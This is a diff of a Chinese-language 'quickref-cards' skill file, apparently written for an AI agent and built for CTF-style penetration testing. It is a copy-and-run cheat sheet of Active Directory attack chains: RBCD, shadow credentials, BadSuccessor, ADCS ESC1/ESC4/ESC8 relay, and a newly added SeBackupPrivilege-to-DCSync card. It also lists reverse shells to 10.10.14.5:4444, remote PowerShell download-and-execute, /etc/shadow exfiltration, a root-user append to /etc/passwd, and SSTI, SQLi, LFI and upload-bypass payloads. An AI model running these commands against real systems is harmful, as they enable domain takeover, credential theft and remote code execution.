@@ -1,17 +1,16 @@
 ---
 name: 'quickref-cards'
-description: '🔴 高频攻击链一键参考卡片 — 每条含前置验证+具体实例+常见错误+成功输出样例。卡壳时第一站。'
-whenToUse: '卡壳第一站：搜攻击名直接抄命令链'
+description: '🔴 高频攻击链一键参考卡片 — 每条含前置验证+具体实例+常见错误+成功输出样例。卡壳时第一站。（检索词：quickref/cheatsheet/attack-chain/reference/high-frequency/attack chain/high frequency/cards）'
 metadata: { domain: meta, tier: T1 }
 ---
-> 📌 DSH 用法：用 skill 工具按名加载本卡。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # 攻击链一键参考卡片
 
 > 🔴 **卡壳第一站：CTRL+F 搜攻击名 → 照抄命令 → 改 IP/域/用户 → 执行。**
 > 每张卡片 = 前置验证 + 攻击命令(抽象+具体实例) + 成功输出样例 + 常见失败→解决
 > 📌 **bloodyAD**: `bloodyAD -H DC_IP -d DOMAIN -u USER -p PASS <category> <cmd> [args]`
-> 📌 **impacket**: `impacket-*` 命令直接执行（已入 PATH）
+> 📌 **impacket**: `impacket-xxx` = `python3 /path/to/xxx.py`
 
 ---
 
@@ -37,7 +36,7 @@ bloodyAD -H DC_IP -d dom -u user -p pass add computer FAKE01 'Password123!'
 # 4. 确认受控账户凭据有效
 nxc smb DC_IP -u 'controlled_user' -p 'password' -d dom
 # 成功输出: [+] dom\controlled_user
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -59,13 +58,13 @@ impacket-getST -k -no-pass -dc-ip 10.10.10.10 \
 export KRB5CCNAME=Administrator@cifs_COMP01.corp.local.ccache
 # 🔴 目标 = DC → 自动 DCSync；目标 = 成员服务器 → dump 本地 SAM
 impacket-secretsdump -k -no-pass 'corp.local/Administrator@COMP01.corp.local'
-```text
+```
 
 ### 验证 RBCD 写入成功
 ```bash
 bloodyAD -H DC_IP -d dom -u user -p pass get object "CN=COMP01,CN=Computers,DC=dom,DC=local" --attr msDS-AllowedToActOnBehalfOfOtherIdentity
 # 成功输出: msDS-AllowedToActOnBehalfOfOtherIdentity: <binary blob> → RBCD 已设置 ✅
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -75,8 +74,6 @@ bloodyAD -H DC_IP -d dom -u user -p pass get object "CN=COMP01,CN=Computers,DC=d
 | `KRB_AP_ERR_SKEW` | 时钟偏差 | `ntpdate -b DC_IP` |
 | `constrained delegation (S4U2Proxy) failed` | ST 不含 TGT | 合并 TGT+ST ccache 或直接传密码 |
 | bloodyAD `add rbcd` access denied | 无 Write 权限 | 回到前置验证步骤 1 |
-
-📌 完整版见 rbcd-spnless 卡
 
 ---
 
@@ -96,7 +93,7 @@ bloodyAD -H DC_IP -d dom -u user -p pass get object '' --attr domainControllerFu
 # 3. 确认目标域有 CA (否则 KDC_ERR_PADATA_TYPE_NOSUPP)
 certipy find -u 'user@dom' -p 'pass' -dc-ip DC -stdout | grep -i "CA Name"
 # 有输出 → CA 存在 ✅
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -114,7 +111,7 @@ bloodyAD -H DC_IP -d dom -u user -p pass add shadowCredentials 'target_user'
 # === 方案C: pywhisker (certipy 失败时) ===
 pywhisker.py -d "dom.local" -u "user" -p "pass" --target "target_user" --action "add" --filename "target"
 # 然后用 PKINITtools 或 certipy auth 拿 TGT
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -141,7 +138,7 @@ bloodyAD -H DC_IP -d dom -u user -p pass get writable
 
 # 3. 确认 OS
 nxc smb DC_IP -u user -p pass | grep -i "Windows Server 2025"
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -149,7 +146,7 @@ nxc smb DC_IP -u user -p pass | grep -i "Windows Server 2025"
 # 来源: github.com/logangoins/SharpSuccessor (需自行编译)
 SharpSuccessor.exe add /impersonate:Administrator \
   /path:"OU=Service Accounts,DC=corp,DC=local" \
-  /account:jsmith /password:Summer2025!
+  /account:<user> /password:<password>
 
 # === 方案B: bloodyAD 分步 ===
 # 1. 创建 dMSA (子命令名是 badSuccessor，不是 add dMSA！)
@@ -181,7 +178,7 @@ print('Modify result:', conn.result)
 badS4U2self 'kerberos+pw://corp.local/jsmith:Summer2025!@10.10.10.10/' \
   'krbtgt/corp.local@corp.local' 'SVC_MSA$@corp.local' --dmsa
 # 成功输出: Administrator NT hash: xxxxxxxxxxxxxxxx
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -206,7 +203,7 @@ certipy find -u 'u@d' -p 'p' -dc-ip DC -stdout -enabled -vulnerable
 # 2. 获取域 SID（-sid 参数需要，当 UPN 与目标 SID 不匹配时必填）
 impacket-lookupsid 'dom/user:pass@DC' | grep "Domain SID"
 # 输出: S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -221,7 +218,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip 10.10.10.10
 
 # 🔴 如果用 -upn 失败，加上域 SID:
 certipy req ... -upn 'administrator@corp.local' -sid S-1-5-21-1234567890-1234567890-1234567890-500
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -229,8 +226,6 @@ certipy req ... -upn 'administrator@corp.local' -sid S-1-5-21-1234567890-1234567
 | `CERTSRV_E_TEMPLATE_DENIED` | 无 Enrollment 权限 | 换其他模板或用 ESC4 改权限 |
 | `The NETBIOS connection with the remote host is not available` | -target 不正确 | 确认 CA 服务器 FQDN |
 | certipy req 成功但 certipy auth 失败 | UPN-SID 不匹配 | 加 `-sid <DomainSID>-500` |
-
-📌 完整版见 adcs-attack-chain 卡
 
 ---
 
@@ -254,15 +249,13 @@ certipy auth -pfx 'admin.pfx' -dc-ip DC
 
 # 4. 🔴 恢复原配置！
 certipy template -template 'VULN_TPL' -u 'u@d' -p 'p' -dc-ip DC -write-configuration orig.json
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
 |------|------|------|
 | certipy template `access denied` | 无模板写权限 | 确认 certipy find 输出含 ESC4 |
 | 第3步拿不到证书 | 模板未开启 ENROLLEE_SUPPLIES_SUBJECT | 手动 `set object` 改 mspki-certificate-name-flag |
-
-📌 完整版见 adcs-attack-chain 卡
 
 ---
 
@@ -279,7 +272,7 @@ curl -k https://CA_SERVER/certsrv/ | grep -i "Active Directory Certificate Servi
 # 🔴 攻击机端口检查 — 445 必须空闲！
 ss -tlnp | grep 445
 # 有输出 → 已有进程占用 → 先 kill 或换方案
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -303,9 +296,7 @@ python3 PetitPotam.py -d corp.local -u 'jsmith' -p 'Summer2025!' \
 certipy auth -pfx 'dc01.pfx' -dc-ip 10.10.10.10 -username 'DC01$' -domain 'corp.local'
 # 成功输出: [*] Got hash for 'DC01$': <NT>:<LM>
 impacket-secretsdump -k -no-pass 'corp.local/DC01$@DC01.corp.local'
-```text
-
-📌 完整版见 adcs-attack-chain 卡
+```
 
 ---
 
@@ -323,7 +314,7 @@ nxc mssql TARGET -u 'user' -p 'pass' -d dom -M mssql_priv  # 查权限
 # 确认是 sysadmin
 nxc mssql TARGET -u u -p p -q "SELECT is_srvrolemember('sysadmin')"
 # 输出 1 → sysadmin ✅
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -358,7 +349,7 @@ SQL> EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
 SQL> DECLARE @shell INT; EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT;
 SQL> EXEC sp_oamethod @shell, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\out.txt';
 SQL> EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';  # 或用 BULK INSERT 读文件
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -367,8 +358,6 @@ SQL> EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';  # 或用 BULK INSERT 读�
 | `xp_cmdshell` blocked / not found | 被禁用或删除 | 尝试 OLE Automation (路径E) |
 | 命令执行无回显 (只有 NULL) | xp_cmdshell 输出限制 | `INSERT INTO #tmp EXEC xp_cmdshell 'cmd'; SELECT * FROM #tmp` |
 | `EXECUTE AS LOGIN` 失败 | 无 IMPERSONATE 权限 | 先查: `SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'` |
-
-📌 完整版见 mssql-attack-chain 卡
 
 ---
 
@@ -384,7 +373,7 @@ nxc smb 10.0.0.0/24 --gen-relay-list targets.txt
 # 确认 LDAP signing 状态
 nxc ldap DC_IP
 # signing: False → 可 relay ✅
-```text
+```
 
 ### 攻击命令
 ```bash
@@ -409,7 +398,7 @@ impacket-getST -spn 'cifs/DC' -impersonate 'Administrator' -dc-ip DC \
   'dom/NEWCOMP$:Password123!'
 export KRB5CCNAME=Administrator@cifs_DC.ccache
 impacket-secretsdump -k -no-pass DC
-```text
+```
 
 ---
 
@@ -441,7 +430,7 @@ impacket-getTGT 'dom/gMSA_SVC$' -hashes ':NT_HASH' -dc-ip DC
 # 或用 AES256:
 impacket-getTGT 'dom/gMSA_SVC$' -aesKey <AES256_HEX> -dc-ip DC
 export KRB5CCNAME=gMSA_SVC\$.ccache
-```text
+```
 
 ### 常见失败
 | 错误 | 原因 | 解决 |
@@ -451,6 +440,42 @@ export KRB5CCNAME=gMSA_SVC\$.ccache
 | `gMSADumper.py` 无输出 | 权限不足或 gMSA 不存在 | 先验证: `get object ... --attr sAMAccountName` |
 
 ---
+
+## Card 9b: Backup Operators / SeBackupPrivilege → 机器账户 → DCSync
+
+### 识别信号
+```
+whoami /priv 有 SeBackupPrivilege   |   ESC13 把你放进 Backup Operators
+★ 服务账户的代码执行【不保证】有 SeImpersonate（服务的 RequiredPrivileges 可摘掉）
+  → whoami /priv 里没有 → Potato 是死路，别硬啃，直接转这条
+```
+
+### 攻击命令
+```bash
+# 1) 让【目标机的 Remote Registry 服务】代读 hive；落点必须是 DC 本地路径
+KRB5CCNAME=svc.ccache proxychains -q impacket-reg -k -no-pass -dc-ip DC \
+  'dom/u@dc.dom' backup -o 'C:\Windows\SYSVOL\sysvol'
+#    [*] Saved HKLM\SAM / SYSTEM / SECURITY   ← 三条都要成功
+
+# 2) 取回：SYSVOL 共享【任意已认证域用户可读】→ 不需要 DC 上的 WinRM / C$
+printf 'use SYSVOL\nget SAM.save\nget SYSTEM.save\nget SECURITY.save\n' | \
+  KRB5CCNAME=svc.ccache proxychains -q impacket-smbclient -k -no-pass dc.dom
+
+# 3) 离线 dump（★ 必须带 SECURITY，$MACHINE.ACC 在里面）
+impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
+
+# 4) 机器账户 hash 直接 DCSync（DC 机器账户属 Enterprise Domain Controllers，自带复制权限）
+impacket-secretsdump 'DC01$@DC_IP' -hashes :<DC01$_NT> -just-dc-ntlm
+#    → Administrator:500:...:<域管 NT hash> → evil-winrm / smbclient 读 root.txt
+```
+
+### 常见失败
+```
+三条全挂 rpc_s_access_denied      → -o 写的是 UNC（\\其他主机\共享）→ 改 DC 本地路径
+ERROR_ALREADY_EXISTS (0xb7)       → ★ 上一次其实【已经成功】，文件已存在，直接去取
+在 WinRM 里跑 reg.exe save 被拒    → 你自己的网络登录令牌没有该特权 → 必须用 impacket-reg
+SYSVOL 里的 hive 删不掉(Access Denied) → SYSVOL 写权限只给 DC → 用 atexec/wmiexec 在 DC 本地删
+```
 
 ## Card 10: Kerberos-Only 环境速查
 
@@ -465,7 +490,7 @@ evil-winrm -i DC -u u -p p         # access denied
 # 信号2: Kerberos 成功
 impacket-getTGT dom/user:'pass' -dc-ip DC  # ✅ TGT acquired
 # 成功输出: [*] Saved credential cache to 'user.ccache'
-```text
+```
 
 ### 强制 Kerberos 工具链
 ```bash
@@ -485,7 +510,7 @@ nxc smb DC -k --use-kcache
 # 🔴 AES256-only 环境 (RC4 全禁用 → $krb5$23$ 等不工作)
 impacket-getTGT dom/user -aesKey <AES256_HEX> -dc-ip DC
 # AES256 获取方法: 见 Card 9 - gMSA 密码提取
-```text
+```
 
 ---
 
@@ -512,7 +537,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
 
 # === PHP ===
 php -r '$s=fsockopen("10.10.14.5",4444); proc_open("/bin/bash -i", array(0=>$s,1=>$s,2=>$s), $p);'
-```text
+```
 
 ### Windows 受害机
 ```powershell
@@ -524,7 +549,7 @@ pwsh -c "$t='10.10.14.5';$p=4444; $c=New-Object System.Net.Sockets.TCPClient($t,
 
 # === nc.exe (上传后) ===
 nc.exe 10.10.14.5 4444 -e cmd.exe
-```text
+```
 
 ### 攻击机监听
 ```bash
@@ -540,7 +565,7 @@ rlwrap nc -lvnp 4444
 # 拿到 shell 后立即升级:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Ctrl-Z 暂停 → stty raw -echo; fg → export TERM=xterm
-```text
+```
 
 ---
 
@@ -565,7 +590,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 # 攻击机: base64 -w0 tool | xclip -sel c  (xclip 需 apt install xclip)
 # 受害机: echo '<base64>' | base64 -d > /tmp/tool
 # Windows: certutil -decode b64.txt tool.exe
-```text
+```
 
 ### 受害机 → 攻击机 (下载/窃取)
 ```bash
@@ -584,7 +609,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 # === Base64 (小文件, 无网络传输) ===
 # 受害机: base64 -w0 /etc/shadow → 复制输出
 # 攻击机: echo '<paste>' | base64 -d > shadow
-```text
+```
 
 ### 特殊场景
 ```bash
@@ -596,7 +621,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # SCP (有 SSH 凭据时):
 scp user@10.10.14.5:/path/file /tmp/
-```text
+```
 
 ---
 
@@ -624,7 +649,7 @@ ps aux | grep chisel | grep -v grep  # 进程存活
 # socks5 127.0.0.1 1080
 
 # 使用: proxychains4 nxc smb 172.16.1.0/24
-```text
+```
 
 ### Ligolo-ng (备选 — 双层代理, 更稳定)
 ```bash
@@ -643,14 +668,14 @@ sudo ip route add 172.16.1.0/24 dev ligolo
 ligolo-ng » session                # 选 session
 ligolo-ng » start                  # 启动隧道
 # → 172.16.1.0/24 现在直接从攻击机可达 (无需 proxychains!)
-```text
+```
 
 ### SSH 动态转发 (有 SSH 凭据时)
 ```bash
 # 攻击机:
 ssh -D 1080 -N -f user@VICTIM_IP
 # → 127.0.0.1:1080 SOCKS 代理
-```text
+```
 
 ---
 
@@ -695,7 +720,7 @@ ss -ntlp | grep 127.0.0.1
 # 7. 可写 /etc/passwd
 ls -la /etc/passwd /etc/shadow
 # 可写 passwd → openssl passwd -1 'password' 生成 hash → echo 'toor:$1$...:0:0::/root:/bin/bash' >> /etc/passwd; su toor
-```text
+```
 
 ### 专用提权 CVE 对照
 ```bash
@@ -709,7 +734,7 @@ pkexec --version    # polkit 版本
 
 dpkg -l | grep -iE 'snapd|docker|lxc'
 # snapd < 2.73 → CVE-2021-44731 (snap-confine)
-```text
+```
 
 ---
 
@@ -732,7 +757,7 @@ dpkg -l | grep -iE 'snapd|docker|lxc'
 
 # FreeMarker (Java):
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
-```text
+```
 
 ### SQLi (快速检测 → 利用)
 ```bash
@@ -745,7 +770,7 @@ dpkg -l | grep -iE 'snapd|docker|lxc'
 ' UNION SELECT 1,@@version,3--  # 版本
 ' UNION SELECT 1,db_name(),3--   # 数据库名
 '; EXEC xp_cmdshell 'whoami'--   # RCE (需 sysadmin)
-```text
+```
 
 ### LFI → RCE
 ```bash
@@ -766,7 +791,7 @@ python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
 
 # pearcmd (Laravel/PHP, register_argc_argv=On):
 # /index.php?+config-create+/&locale=../../../public/shell.php&+<?=system($_GET['c'])?>+
-```text
+```
 
 ### 文件上传 Bypass
 ```bash
@@ -775,7 +800,7 @@ python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
 # .php.jpg → .php (截断: %00, .php%00.jpg)
 # 内容: GIF89a; <?php system($_GET['c']); ?>
 # Content-Type: image/gif → 改 application/x-php
-```text
+```
 
 ---
 
@@ -796,7 +821,7 @@ nxc ldap DC -u user -p pass --asreproast asrep.txt
 # 2. 破解
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 # john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
-```text
+```
 
 ### Kerberoasting
 ```bash
@@ -820,9 +845,7 @@ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 # 🔴 如果输出 $18$ (AES256) → 几乎不可爆破 → 放弃, 换委派路径!
 # 🔴 Targeted AS-REP (对特定用户, 需 GenericWrite — 设 DONT_REQ_PREAUTH 后 roast):
 # bloodyAD -H DC -d dom -u user -p pass add uac target -f DONT_REQ_PREAUTH
-```text
-
-📌 完整版见 lateral-movement 卡
+```
 
 ---
 
@@ -840,7 +863,7 @@ bloodyAD -H DC_IP -d dom -u user -p pass get bloodhound
 # === bloodhound-python (备选) ===
 bloodhound-python -u 'user' -p 'pass' -d dom -dc DC_IP -c All --zip
 # 输出: <timestamp>_bloodhound.zip
-```text
+```
 
 ### 本地采集 (Windows 受害机)
 ```powershell
@@ -852,7 +875,7 @@ SharpHound.exe -c Session,Group,Trusts,ACL --zipfilename bloodhound.zip
 # === SharpHound.ps1 (内存执行) ===
 iex (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/SharpHound.ps1')
 Invoke-BloodHound -CollectionMethod All --ZipFileName bloodhound.zip
-```text
+```
 
 ### 导入 BloodHound
 ```bash
@@ -874,9 +897,7 @@ bloodhound-ce
 # 找 AS-REP: MATCH (u:User {dontreqpreauth:true}) RETURN u
 # 找机器到机器的 Session: MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c,u
 # 最短路径到 DA: MATCH p=shortestPath((s:User {name:'JSMITH@DOM.LOCAL'})-[r*1..]->(t:Group {name:'DOMAIN ADMINS@DOM.LOCAL'})) RETURN p
-```text
-
-📌 完整版见 lateral-movement 卡
+```
 
 ---
 
@@ -888,4 +909,4 @@ bloodhound-ce
 [3] 🔴 klist                                         # 验证 TGT 有效未过期
 [4] 🔴 nxc smb DC -k --use-kcache                    # 确认 Kerberos 认证可达
 [5] 🔴 隧道验证: ss -tlnp | grep <proxy_port>         # SOCKS 存活？
-```text
+```
